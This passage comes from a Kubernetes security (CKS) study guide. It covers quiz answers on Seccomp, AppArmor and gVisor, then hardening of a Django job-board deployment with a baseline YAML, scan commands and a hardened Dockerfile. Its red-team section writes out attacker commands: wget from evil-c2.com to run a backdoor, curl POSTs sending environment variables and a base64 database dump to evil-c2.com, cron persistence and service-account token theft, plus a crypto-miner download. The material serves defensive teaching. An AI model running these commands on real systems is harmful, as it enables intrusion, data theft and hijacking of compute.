The CKS testing workflow: deploy → observe → fix → redeploy. Never apply an untested Seccomp profile to production. On the exam, use dmesg | grep seccomp to see which syscalls were blocked, then add them to the allow list.

Q8
Write an AppArmor profile that denies access to /proc/sysrq-trigger, /sys/kernel/security/, and /etc/kubernetes/. Why are these paths dangerous?
Show Answer
Answer
profile k8s-hardened flags=(attach_disconnected) {
  #include <abstractions/base>
  deny /proc/sysrq-trigger rw,
  deny /sys/kernel/security/** rw,
  deny /etc/kubernetes/** rw,
  /app/** r,
  /tmp/** rw,
}

sysrq-trigger: instant reboot/poweroff. /sys/kernel/security: kernel security config. /etc/kubernetes: PKI certs, kubeconfig — reading enables API impersonation.

Explanation

AppArmor deny rules create a safety net. Even if a container gains root and hostPath access, AppArmor blocks reads/writes to these critical paths. This is the "last line of defense" before the kernel. On the CKS exam, deny rules in AppArmor complement allow rules in Seccomp.

Q9
A pod needs to run as root for a legacy application. How do you maximize security with kernel modules despite running as root?
Show Answer
Answer

(1) Seccomp: Apply the strictest possible profile — block ptrace, mount, unshare, chmod, and all non-essential syscalls. (2) AppArmor: Deny access to /etc/kubernetes, /proc/sysrq-trigger, /sys/kernel, and all non-app paths. (3) No new privileges: allowPrivilegeEscalation: false. (4) NetworkPolicy: Default-deny egress — the pod can only talk to its database. (5) Runtime: Use gVisor for kernel-level isolation (root in gVisor ≠ root on host). (6) Monitoring: Falco rule for shell spawn in this pod.

Explanation

Legacy apps that require root are a reality. The CKS approach: accept the root requirement but add EVERY other control. Root inside gVisor with Seccomp + AppArmor + NetworkPolicy is far safer than root in runc with no controls. On the exam, never suggest "just let it run as root" — always propose compensating controls.

Q10
Compare the security boundaries provided by: Namespaces, cgroups, Seccomp, AppArmor, and gVisor. Draw the hierarchy from weakest to strongest isolation.
Show Answer
Answer

Weakest → Strongest: (1) cgroups: Resource limits only — no security isolation. (2) Namespaces: Visibility isolation — can't see other processes/files. Can be escaped via kernel bugs. (3) Seccomp: Syscall filtering — limits what operations are possible. Runs on host kernel. (4) AppArmor/SELinux: Path/label-based access control. Runs on host kernel. (5) gVisor: User-space kernel — syscalls never reach host. (6) Kata Containers: Hardware VM — separate kernel. Strongest isolation.

Explanation

This hierarchy is core CKS knowledge. Each layer adds incremental security. The CKS exam tests combining layers: namespaces (basic), Seccomp (syscall control), AppArmor (file control), gVisor (kernel isolation). No single layer is sufficient.

Chapter 33: Complete Security Hardening of anihpj/jobpost

You've learned the theory. Now let's apply every CKS control to a real application. anihpj/jobpost is a Django-based job board — 5 models (JobPost, Author, Location, Skills, User), PostgreSQL database, Redis cache. Right now it runs with zero security hardening: pods run as root, no NetworkPolicies, secrets in plaintext, no image scanning. This chapter takes you from a kubesec score of 2/10 to a CKS-exam-ready 8/10 — applying RBAC, PSS, Seccomp, AppArmor, read-only filesystems, NetworkPolicy, encryption at rest, Falco monitoring, and image supply chain security. Every code block in this chapter is production-ready — copy, adapt, deploy.

🔴 Advanced ⏱️ ~2 hours 🏗️ Hands-On 🛡️ Full Stack Security

🎯 What You'll Learn — Core-Level Mastery

  • ✅ Assess baseline security: Run kube-bench, kubesec, and Trivy on an unsecured cluster to quantify the starting risk
  • ✅ Harden the image supply chain: Multi-stage Dockerfile, Trivy CI scan, cosign signing, Kyverno verification — end-to-end
  • ✅ Apply defense-in-depth pod security: Non-root user, read-only FS, drop ALL capabilities, Seccomp RuntimeDefault, custom AppArmor profile
  • ✅ Enforce admission control: PSS Restricted labels, OPA Gatekeeper image registry policy, Kyverno verifyImages for cosign signatures
  • ✅ Least-privilege RBAC: Dedicated ServiceAccounts, disabled automount, minimal Roles/RoleBindings per workload
  • ✅ Network microsegmentation: Default-deny NetworkPolicy with explicit allow rules for ingress, database, cache, DNS, monitoring
  • ✅ Encrypt secrets at rest: EncryptionConfiguration for etcd, secret rotation, HashiCorp Vault integration for Django SECRET_KEY
  • ✅ Deploy runtime monitoring: Custom Falco rules for Django-specific threats, audit policy for secret access and pod exec logging
  • ✅ Measure improvement: Before/after security scorecard across 13 dimensions

Cluster Setup 10% Cluster Hardening 15% System Hardening 15% Microservice Vulnerability 20% Supply Chain Security 20% Runtime Security 20%

33.1 The Starting Point — An Unsecured anihpj Cluster

Before hardening, you must measure the baseline. Here's anihpj running with default Kubernetes settings — exactly what you'd get with kubectl create deploy and no security configuration:

Baseline anihpj Deployment — What "Unsecured" Looks Like

YAML — anihpj BEFORE hardening (default Kubernetes settings) 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: anihpj
  namespace: default          # ❌ Default namespace — no isolation
spec:
  replicas: 1
  selector:
    matchLabels:
      app: anihpj
  template:
    metadata:
      labels:
        app: anihpj
    spec:
      containers:
      - name: anihpj
        image: anihpj/jobpost:latest    # ❌ :latest tag — mutable, unpinned
        ports:
        - containerPort: 8000
        env:
        - name: SECRET_KEY
          value: "django-insecure-abc123"   # ❌ Hardcoded secret in plaintext
        - name: DB_PASSWORD
          value: "password123"              # ❌ Another hardcoded secret
        # ❌ No securityContext at all
        # ❌ No resource limits
        # ❌ No liveness/readiness probes
---
apiVersion: v1
kind: Service
metadata:
  name: anihpj
  namespace: default
spec:
  type: LoadBalancer           # ❌ Exposes directly to internet
  selector:
    app: anihpj
  ports:
  - port: 80
    targetPort: 8000

Attack Surface Analysis — What an Attacker Could Do RIGHT NOW

ATTACK SURFACE Unsecured anihpj — 6 Attack Vectors Available to Any Attacker
1
Read secrets from environment

kubectl exec anihpj-xxx -- env | grep SECRET → Returns SECRET_KEY and DB_PASSWORD in plaintext. Attacker now has database access.

2
Install crypto miner

kubectl exec anihpj-xxx -- wget evil.com/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig → Runs as ROOT. Writable FS allows persistence.

3
Lateral movement to database

No NetworkPolicy. Attacker can curl postgres:5432 from compromised anihpj pod. Uses stolen DB_PASSWORD from env.

4
Escape to host node

Privileged container (not explicitly set, but default allows all capabilities). With CAP_SYS_ADMIN, attacker can mount host filesystem.

5
Read all cluster secrets

Default ServiceAccount token mounted. curl https://kubernetes.default/api/v1/secrets -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" — if RBAC is too permissive.

6
Exfiltrate user data

Django admin accessible. Attacker dumps all JobPost, User, Author data. No egress filtering. Data leaves cluster undetected.

  ✅ SBOM generated per build         ✅ SLSA Level 3 provenance
  ✅ OPA/Kyverno policies as code     ✅ mTLS for all pod traffic
  ✅ Sandboxed runtimes for untrusted ✅ Vault for external secrets
  ✅ Continuous Trivy Operator        ✅ Security dashboards in Grafana
  ✅ Automated incident response      ✅ GitOps: ArgoCD syncs policies
  📊 kubesec score: 9-10/10

  🎓 This guide takes you: Level 0 → Level 1 → Level 2 (CKS) →
     Level 3 (production best practices you'll be ready for)

Running the Baseline Scans — Exact Commands

The numbers in the scan results above aren't hypothetical. Here's exactly how to generate them on your own cluster:

Bash — Commands to assess your cluster's security baseline 
# 1. Run kube-bench against the control plane (master node)
kube-bench run --targets master --benchmark cis-1.23

# 2. Run kube-bench against worker nodes
kube-bench run --targets node --benchmark cis-1.23

# 3. Scan your deployment with kubesec
kubectl get deploy anihpj -n default -o yaml | kubesec-scan -
# Output includes a score (0-10) and a list of PASS/FAIL checks

# 4. Scan your container image with Trivy
trivy image anihpj/jobpost:latest --severity CRITICAL,HIGH --format table
# --format json for machine-readable output
# --severity filters to only show specified levels

# 5. Check which pods run as root (quick audit)
kubectl get pods -A -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.runAsNonRoot != true) |
  {namespace: .metadata.namespace, name: .metadata.name}'
# If this returns ANY pods, you have root containers running

# 6. Check which namespaces have NO NetworkPolicy
kubectl get ns -o json | jq -r '.items[] |
  select(.metadata.name as $ns |
    ['$(kubectl get netpol -A -o json | jq -r '.items[].metadata.namespace')'] |
    index($ns) | not) | .metadata.name'
# Every namespace listed here is wide open

Why Each Vulnerability Exists — Default Kubernetes Behavior Explained

VulnerabilityWhy It's the DefaultWhy It's Dangerous
Pods run as rootKubernetes doesn't enforce runAsNonRoot by default — it's opt-in. Most base images (python, node, nginx) default to root.Any container breakout = root on the host node. Attacker can read/write host filesystem, load kernel modules, access all processes.
No NetworkPolicyKubernetes is "flat network" by design — all pods can communicate. NetworkPolicy requires a CNI plugin that supports it (Calico, Cilium, Weave).Compromised web pod can attack database, cache, and other services. Lateral movement is unrestricted.
Secrets in plaintext envIt's the simplest way to pass config to apps. kubectl create secret generic is easy, but referencing secrets via secretKeyRef requires extra YAML.Anyone who can kubectl exec or read pod specs can see secrets. Secrets are also plaintext in etcd by default.
No Seccomp/AppArmorThese are Linux kernel features that require OS-level setup. Kubernetes can't assume they're available on all nodes.Container can call ANY syscall (~300+). Malware can use ptrace to inject into other processes, mount to access host filesystems.
Overpermissive RBACThe default ServiceAccount exists in every namespace. Many Helm charts and operators bind cluster-wide permissions without scoping them.A compromised pod's SA token may have cluster-admin. Attacker can read all secrets, create privileged pods, delete resources.

Attacker's-Eye View — Exact Commands They'd Run

RED TEAM If an attacker got shell access to an unsecured anihpj pod RIGHT NOW 
# Step 1: Reconnaissance — what can I see?
whoami                    # → root (UID 0!)
id                        # → uid=0(root) gid=0(root) groups=0(root)
env | grep -i secret      # → SECRET_KEY=django-insecure-abc123, DB_PASSWORD=password123
env | grep -i key         # → AWS_ACCESS_KEY_ID, API_KEY, etc. (if configured)
cat /proc/1/cgroup        # → Pod ID and container runtime info

# Step 2: Check filesystem writability
ls -la /tmp               # → drwxrwxrwt (writable!)
touch /tmp/test            # → SUCCESS (writable filesystem confirmed)
wget http://evil-c2.com/backdoor -O /tmp/backdoor  # → Downloads malware
chmod +x /tmp/backdoor     # → Makes it executable
/tmp/backdoor &            # → Runs in background (persistence!)

# Step 3: Lateral movement
curl http://postgres.anihpj-prod:5432    # → No NetworkPolicy = connects!
curl http://redis.anihpj-prod:6379       # → Cache accessible
cat /var/run/secrets/kubernetes.io/serviceaccount/token  # → SA token

# Step 4: Exfiltration
curl -X POST http://evil-c2.com/exfil -d "$(env)"        # → All env vars sent
curl -X POST http://evil-c2.com/exfil -d "$(cat /app/db.sqlite3 | base64)"  # → DB dumped

# Step 5: Persistence
echo "*/5 * * * * /tmp/backdoor" >> /etc/crontab  # → Survives pod restart
# (Wait — /etc/crontab is writable because root FS is not read-only!)

33.2 Step 1 — Secure the Image and Supply Chain

The first line of defense is the container image itself. A hardened image is small (minimal attack surface), free of CRITICAL CVEs, signed for integrity verification, and runs as a non-root user by design. This section walks through the complete supply chain: build → scan → sign → verify.

Hardened Multi-Stage Dockerfile for anihpj

Dockerfile — Multi-stage build: compile in full image, run in minimal 
# ============================================
# STAGE 1: BUILDER — Compile Python dependencies
# ============================================
FROM python:3.12-slim-bookworm AS builder

# Install build dependencies ONLY (removed from final image)
RUN apt-get update && apt-get install -y --no-install-recommends \
    build-essential \
    libpq-dev \
    && rm -rf /var/lib/apt/lists/*

# Create non-root user EARLY (security best practice)
RUN groupadd -r anihpj && useradd -r -g anihpj -m -s /bin/bash anihpj

WORKDIR /app

# Copy ONLY requirements first (leverage Docker layer caching)
COPY requirements.txt .

# Install into a VIRTUAL ENVIRONMENT (isolated from system Python)
RUN python -m venv /opt/venv && \
    /opt/venv/bin/pip install --no-cache-dir --upgrade pip setuptools && \
    /opt/venv/bin/pip install --no-cache-dir -r requirements.txt && \
    /opt/venv/bin/pip install --no-cache-dir \
      gunicorn==22.0.0 \
      psycopg2-binary==2.9.9 \
      django-storages==1.14.4

# ============================================
# STAGE 2: RUNTIME — Minimal production image
# ============================================
FROM python:3.12-slim-bookworm

# Install ONLY runtime libraries (NOT build tools!)
RUN apt-get update && apt-get install -y --no-install-recommends \
    libpq5 \
    curl \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/* \
    && apt-get clean

# Create the SAME non-root user (UID/GID must match or files owned by nobody)
RUN groupadd -r anihpj && useradd -r -g anihpj -m -s /bin/bash anihpj

# Copy virtual environment from builder (NO build tools in final image!)
COPY --from=builder /opt/venv /opt/venv

# Set environment variables
ENV PATH="/opt/venv/bin:$PATH" \
    PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1 \
    PYTHONHASHSEED=random \
    DJANGO_SETTINGS_MODULE=anihpj.settings

WORKDIR /app

# Copy application code AFTER dependencies (layer caching optimization)
COPY --chown=anihpj:anihpj . .

# Create writable directories (these will be mounted as emptyDir later)
RUN mkdir -p /app/staticfiles /app/media /tmp/app && \
    chown -R anihpj:anihpj /app/staticfiles /app/media /tmp/app

# Switch to non-root user — ALL processes run as UID 1000 from here
USER anihpj

# Collect static files during build (immutable assets)
RUN python manage.py collectstatic --noinput

EXPOSE 8000

# Health check — Kubernetes uses this to determine pod readiness
HEALTHCHECK --interval=30s --timeout=5s --start-period=15s --retries=3 \
    CMD curl -f http://localhost:8000/healthz/ || exit 1

# Run Gunicorn with optimized settings for production
CMD ["gunicorn", "anihpj.wsgi:application", \
     "--bind", "0.0.0.0:8000", \
     "--workers", "3", \
     "--threads", "2", \
     "--timeout", "60", \
     "--max-requests", "1000", \
     "--max-requests-jitter", "100", \
     "--access-logfile", "-", \
     "--error-logfile", "-"]

.dockerignore — What NOT to Include in the Image

.dockerignore — Prevent secrets and dev artifacts from leaking into image 
# Python
__pycache__/
*.py[cod]

build/

# Virtual environment (recreated in container)

# Docker
Dockerfile
